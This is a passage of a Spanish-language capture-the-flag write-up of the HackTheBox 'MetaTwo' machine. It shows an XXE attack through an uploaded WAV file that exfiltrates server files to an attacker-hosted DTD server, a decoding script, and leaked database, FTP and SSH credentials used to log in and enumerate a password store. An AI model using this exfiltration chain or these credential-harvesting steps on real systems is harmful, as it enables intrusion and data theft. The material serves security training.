</code></pre></div><p>Luego, iniciamos el servidor PHP que para que sirva el archivo <code>evil.dtd</code> y muestre un <em>payload</em> codificado cuando carguemos el archivo WAV:</p><p><img alt="MetaTwo 8" src="/images/HTB/MetaTwo/MetaTwo-8.webp"></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">make</span> up-mal
php -S 0.0.0.0:8001 -t attacker/www/
[Thu Jan 26 11:55:05 2023] PHP 8.1.2 Development Server (http://0.0.0.0:8001) started
[Thu Jan 26 11:55:26 2023] 10.10.11.186:47020 Accepted
[Thu Jan 26 11:55:26 2023] <span class="code-dark-green">10.10.11.186:47020 [200]: GET /evil.dtd</span>
[Thu Jan 26 11:55:26 2023] 10.10.11.186:47020 Closing
[Thu Jan 26 11:55:27 2023] 10.10.11.186:47030 Accepted
[Thu Jan 26 11:55:27 2023] <span class="code-dark-yellow">10.10.11.186:47030 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory</span>  
[Thu Jan 26 11:55:27 2023] 10.10.11.186:47030 Closing
[Thu Jan 26 11:55:27 2023] 10.10.11.186:47042 Accepted
[Thu Jan 26 11:55:27 2023] <span class="code-dark-green">10.10.11.186:47042 [200]: GET /evil.dtd</span>
[Thu Jan 26 11:55:27 2023] 10.10.11.186:47042 Closing
[Thu Jan 26 11:55:28 2023] 10.10.11.186:47056 Accepted
[Thu Jan 26 11:55:28 2023] <span class="code-dark-yellow">10.10.11.186:47056 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory</span>
[Thu Jan 26 11:55:28 2023] 10.10.11.186:47056 Closing
</code></pre></div><p>Después de eso, las instrucciones del repositorio nos dicen que editemos <code>attacker/decryption.php</code> y pongamos el <em>payload</em> anterior. En su lugar, pondré <code>$argv[1]</code> para pasarle el <em>payload</em> mediante un argumento de línea de comandos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>

<span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk7">zlib_decode</span><span class="mtk1">(</span><span class="mtk7">base64_decode</span><span class="mtk1">($argv[</span><span class="mtk6">1</span><span class="mtk1">]));</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">php</span> <span class="mtku">attacker/decryption.php</span> <span class="code-dark-yellow">'jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw=='</span>  
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
</code></pre></div><p>En este punto, podemos leer archivos del servidor con este procedimiento:</p><ul><li>Poner el nombre del archivo en <code>evil.dtd</code></li><li>Subir <code>malicious.wav</code></li><li>Decodificar el <em>payload</em> recibido en el registro del servidor</li></ul><p>Dado que el servidor web usa nginx, vamos a leer su archivo de configuración (<code>/etc/nginx/sites-enabled/default</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">server</span> {

        <span class="mtk5">listen</span> <span class="mtk4">80</span>;
        <span class="mtk5">listen</span> [::]:80;

        <span class="mtk5">root</span> /var/www/metapress.htb/blog;

        <span class="mtk5">index</span> index.php index.html;

        <span class="mtk5">if</span> ($http_host != <span class="mtk4">"metapress.htb"</span>) {
                <span class="mtk5">rewrite</span> <span class="mtk9">^</span> http://metapress.htb/;
        }

        <span class="mtk7">location</span> <span class="mtk8">/</span> {
                <span class="mtk5">try_files</span> $uri $uri/ /index.php?$args;
        }

        <span class="mtk7">location</span> ~ <span class="mtk9">\.php$</span> {
                <span class="mtk5">include</span> snippets/fastcgi-php.conf;
                <span class="mtk5">fastcgi_pass</span> unix:/var/run/php/php8.0-fpm.sock;  
        }

        <span class="mtk7">location</span> ~* <span class="mtk9">\.(js|css|png|jpg|jpeg|gif|ico|svg)$</span> {
                <span class="mtk5">expires</span> <span class="mtk6">max</span>;
                <span class="mtk5">log_not_found</span> <span class="mtk6">off</span>;
        }

}
</code></pre></div><p>Bien, ahora tenemos el directorio raíz de WordPress. Vamos a leer su archivo de configuración (<code>/var/www/metapress.htb/blog/wp-config.php</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk3">/** The name of the database for WordPress */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_NAME'</span><span class="mtk1">, </span><span class="mtk4">'blog'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL database username */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_USER'</span><span class="mtk1">, </span><span class="mtk4">'blog'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL database password */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_PASSWORD'</span><span class="mtk1">, </span><span class="mtk4">'635Aq@TdqrCwXFUZ'</span><span class="mtk1"> );</span>

<span class="mtk3">/** MySQL hostname */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_HOST'</span><span class="mtk1">, </span><span class="mtk4">'localhost'</span><span class="mtk1"> );</span>

<span class="mtk3">/** Database Charset to use in creating database t</span><span class="mtk3">ables. */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_CHARSET'</span><span class="mtk1">, </span><span class="mtk4">'utf8mb4'</span><span class="mtk1"> );</span>

<span class="mtk3">/** The Database Collate type. Don't change this i</span><span class="mtk3">f in doubt. */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'DB_COLLATE'</span><span class="mtk1">, </span><span class="mtk4">''</span><span class="mtk1"> );</span>

<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FS_METHOD'</span><span class="mtk1">, </span><span class="mtk4">'ftpext'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FTP_USER'</span><span class="mtk1">, </span><span class="mtk4">'metapress.htb'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FTP_PASS'</span><span class="mtk1">, </span><span class="mtk4">'9NYS_ii@FyL_p5M2NvJ'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FTP_HOST'</span><span class="mtk1">, </span><span class="mtk4">'ftp.metapress.htb'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FTP_BASE'</span><span class="mtk1">, </span><span class="mtk4">'blog/'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'FTP_SSL'</span><span class="mtk1">, </span><span class="mtk6">false</span><span class="mtk1"> );</span>

<span class="mtk3">/**#@+</span>
<span class="mtk3"> * Authentication Unique Keys and Salts.</span>
<span class="mtk3"> * @since 2.6.0</span>
<span class="mtk3"> */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'AUTH_KEY'</span><span class="mtk1">,         </span><span class="mtk4">'?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rX</span><span class="mtk4">VG=3 n&gt;+3m?.B/:'</span><span class="mtk1"> );</span>  
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'SECURE_AUTH_KEY'</span><span class="mtk1">,  </span><span class="mtk4">'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rW</span><span class="mtk4">lVq%IQ66pf{=]a%'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'LOGGED_IN_KEY'</span><span class="mtk1">,    </span><span class="mtk4">'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+H</span><span class="mtk4">Xv]||E+F~C{qKXy'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'NONCE_KEY'</span><span class="mtk1">,        </span><span class="mtk4">'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)</span><span class="mtk4">7mxNUg986tQO7O5'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'AUTH_SALT'</span><span class="mtk1">,        </span><span class="mtk4">'[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d</span><span class="mtk4">&lt;&amp;M;.,x0z~R&gt;3!D'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'SECURE_AUTH_SALT'</span><span class="mtk1">, </span><span class="mtk4">'&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~</span><span class="mtk4">omiH^jVC?2-I?I.'</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'LOGGED_IN_SALT'</span><span class="mtk1">,   </span><span class="mtk4">'4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJT</span><span class="mtk4">JEVI) N#NOidIf='</span><span class="mtk1"> );</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'NONCE_SALT'</span><span class="mtk1">,       </span><span class="mtk4">'.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSk</span><span class="mtk4">TGsv%Y451F8L=bL'</span><span class="mtk1"> );</span>

<span class="mtk3">/**</span>
<span class="mtk3"> * WordPress Database Table prefix.</span>
<span class="mtk3"> */</span>
<span class="mtk1">$table_prefix </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'wp_'</span><span class="mtk1">;</span>

<span class="mtk3">/**</span>
<span class="mtk3"> * For developers: WordPress debugging mode.</span>
<span class="mtk3"> * </span><span class="mtk5">@link</span><span class="mtk3"> </span><span class="mtk3 detected-link">https://wordpress.org/support/article/debugging-in</span><span class="mtk3 detected-link">-wordpress/</span>
<span class="mtk3"> */</span>
<span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'WP_DEBUG'</span><span class="mtk1">, </span><span class="mtk6">false</span><span class="mtk1"> );</span>

<span class="mtk3">/** Absolute path to the WordPress directory. */</span>
<span class="mtk5">if</span><span class="mtk1"> ( </span><span class="mtk5">!</span><span class="mtk1"> </span><span class="mtk7">defined</span><span class="mtk1">( </span><span class="mtk4">'ABSPATH'</span><span class="mtk1"> ) ) {</span>
<span class="mtk1">        </span><span class="mtk7">define</span><span class="mtk1">( </span><span class="mtk4">'ABSPATH'</span><span class="mtk1">, </span><span class="mtk6">__DIR__</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">'/'</span><span class="mtk1"> );</span>
<span class="mtk1">}</span>

<span class="mtk3">/** Sets up WordPress vars and included files. */</span>
<span class="mtk5">require_once</span><span class="mtk1"> </span><span class="mtk6">ABSPATH</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">'wp-settings.php'</span><span class="mtk1">;</span>
</code></pre></div><p>Como se puede ver, tenemos credenciales para FTP (puerto 21): <code>metapress.htb:9NYS_ii@FyL_p5M2NvJ</code>. Y así, nos conectamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ftp</span> metapress.htb@10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
229 Entering Extended Passive Mode (|||31636|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer  
226 Transfer complete
</code></pre></div><p>El directorio <code>blog</code> contiene el código fuente de la página de WordPress, no parece interesante:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ftp&gt; dir blog
229 Entering Extended Passive Mode (|||21238|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 metapress.htb metapress.htb      405 Feb  6  2020 index.php
-rw-r--r--   1 metapress.htb metapress.htb    19915 Feb 12  2020 license.txt
-rw-r--r--   1 metapress.htb metapress.htb     7278 Jun 26  2020 readme.html
-rw-r--r--   1 metapress.htb metapress.htb     7101 Jul 28  2020 wp-activate.php
drwxr-xr-x   9 metapress.htb metapress.htb     4096 Oct  5 14:12 wp-admin
-rw-r--r--   1 metapress.htb metapress.htb      351 Feb  6  2020 wp-blog-header.php
-rw-r--r--   1 metapress.htb metapress.htb     2328 Oct  8  2020 wp-comments-post.php  
-rw-r--r--   1 metapress.htb metapress.htb     2032 Jun 23  2022 wp-config.php
-rw-r--r--   1 metapress.htb metapress.htb     2913 Feb  6  2020 wp-config-sample.php
drwxr-xr-x   6 metapress.htb metapress.htb     4096 Oct  5 14:12 wp-content
-rw-r--r--   1 metapress.htb metapress.htb     3939 Jul 30  2020 wp-cron.php
drwxr-xr-x  25 metapress.htb metapress.htb    12288 Oct  5 14:12 wp-includes
-rw-r--r--   1 metapress.htb metapress.htb     2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--   1 metapress.htb metapress.htb     3300 Feb  6  2020 wp-load.php
-rw-r--r--   1 metapress.htb metapress.htb    49831 Nov  9  2020 wp-login.php
-rw-r--r--   1 metapress.htb metapress.htb     8509 Apr 14  2020 wp-mail.php
-rw-r--r--   1 metapress.htb metapress.htb    20975 Nov 12  2020 wp-settings.php
-rw-r--r--   1 metapress.htb metapress.htb    31337 Sep 30  2020 wp-signup.php
-rw-r--r--   1 metapress.htb metapress.htb     4747 Oct  8  2020 wp-trackback.php
-rw-r--r--   1 metapress.htb metapress.htb     3236 Jun  8  2020 xmlrpc.php
226 Transfer complete
</code></pre></div><p>Por otro lado, tenemos <code>mailer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ftp&gt; dir mailer
229 Entering Extended Passive Mode (|||12586|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php  
226 Transfer complete
</code></pre></div><p>Obtengamos el archivo <code>send_email.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ftp&gt; cd mailer
250 CWD command successful
ftp&gt; get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||10313|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |*****************************************************************************************************************|  1126       11.37 KiB/s    00:00 ETA  
226 Transfer complete
1126 bytes received in 00:00 (3.88 KiB/s)
</code></pre></div><p>Este <em>script</em> <code>send_email.php</code> tiene credendiales en texto claro para el usuario <code>jnelson</code> (que es un usuario a nivel de sistema porque aparece en <code>/etc/passwd</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk3">/*</span>
<span class="mtk3"> * This script will be used to send an email to al</span><span class="mtk3">l our users when ready for launch</span>  
<span class="mtk3">*/</span>

<span class="mtk5">use</span><span class="mtk1"> PHPMailer\PHPMailer\</span><span class="mtk7 mtki">PHPMailer</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> PHPMailer\PHPMailer\</span><span class="mtk7 mtki">SMTP</span><span class="mtk1">;</span>
<span class="mtk5">use</span><span class="mtk1"> PHPMailer\PHPMailer\</span><span class="mtk7 mtki">Exception</span><span class="mtk1">;</span>

<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'PHPMailer/src/Exception.php'</span><span class="mtk1">;</span>
<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'PHPMailer/src/PHPMailer.php'</span><span class="mtk1">;</span>
<span class="mtk5">require</span><span class="mtk1"> </span><span class="mtk4">'PHPMailer/src/SMTP.php'</span><span class="mtk1">;</span>

<span class="mtk1">$mail </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">PHPMailer</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">);</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">SMTPDebug </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk8">isSMTP</span><span class="mtk1">();</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Host </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"mail.metapress.htb"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">SMTPAuth </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Username </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"jnelson@metapress.htb"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Password </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Cb4_JmWM8zUZWMu@Ys"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">SMTPSecure </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"tls"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Port </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">587</span><span class="mtk1">;</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">From </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"jnelson@metapress.htb"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">FromName </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"James Nelson"</span><span class="mtk1">;</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk8">addAddress</span><span class="mtk1">(</span><span class="mtk4">"info@metapress.htb"</span><span class="mtk1">);</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk8">isHTML</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">);</span>

<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Subject </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Startup"</span><span class="mtk1">;</span>
<span class="mtk1">$mail</span><span class="mtk5">-&gt;</span><span class="mtk1">Body </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i</span><span class="mtk4">&gt;"</span><span class="mtk1">;</span>

<span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    $mail</span><span class="mtk5">-&gt;</span><span class="mtk8">send</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Message has been sent successfully"</span><span class="mtk1">;</span>
<span class="mtk1">} </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk7 mtki">Exception</span><span class="mtk1"> $e) {</span>
<span class="mtk1">    </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"Mailer Error: "</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $mail</span><span class="mtk5">-&gt;</span><span class="mtk1">ErrorInfo;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Las credenciales anteriores (<code>jnelson:Cb4_JmWM8zUZWMu@Ys</code>) son válidas en SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> jnelson@metapress.htb
jnelson@metapress.htb's password:  
<span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ cat user.txt
7bc26a83a3746408eee60d626bcb806a
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>En el directorio personal de <code>jnelson</code> encontramos una carpeta inusual llamada <code>.passpie</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 <span class="code-blue">.</span>
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 <span class="code-blue">..</span>
lrwxrwxrwx 1 root    root       9 Jun 26  2022 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 <span class="code-blue">.local</span>
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 <span class="code-blue">.passpie</span>
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 Jan 25 14:20 user.txt
</code></pre></div><p>Aquí tenemos estos archivos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ ls -la .passpie/
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 <span class="code-blue">.</span>
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 <span class="code-blue">..</span>
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 <span class="code-green">.config</span>
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 <span class="code-green">.keys</span>
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 <span class="code-blue">ssh</span>
<span class="code-green">jnelson@meta2</span>:<span class="code-blue">~</span>$ ls -la .passpie/ssh/
total 16
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 <span class="code-blue">.</span>
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 <span class="code-blue">..</span>
-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 <span class="code-green">jnelson.pass</span>  
-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 <span class="code-green">root.pass</span>
